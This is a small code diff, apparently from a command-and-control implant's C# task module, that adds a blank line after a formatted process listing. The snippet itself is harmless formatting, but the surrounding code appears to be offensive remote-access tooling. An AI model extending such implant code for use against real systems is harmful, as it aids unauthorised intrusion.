@@ -34,6 +34,7 @@ namespace Implant.Tasks.Execute
                 _out.AppendLine($"{proc.Id.Align(procIDLen)} {proc.ProcessName.Align(procNameLen)} {proc.SessionId.Align(procSessionIDLen)}");
             }
 
+            _out.AppendLine();
             return _out.ToString();
         }
 
